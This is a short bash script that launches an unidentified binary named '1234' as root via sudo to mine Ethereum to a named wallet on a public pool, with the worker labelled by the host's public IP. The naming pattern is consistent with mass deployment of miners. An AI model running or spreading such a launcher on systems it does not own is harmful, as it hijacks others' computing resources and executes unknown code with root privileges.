#!/bin/bash

POOL=eu-eth.beepool.org:9530
WALLET=poetra2501
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-nbo

cd "$(dirname "$0")"

chmod +x ./1234 && sudo ./1234 -a ethash -o $POOL -u $WALLET.$WORKER $@
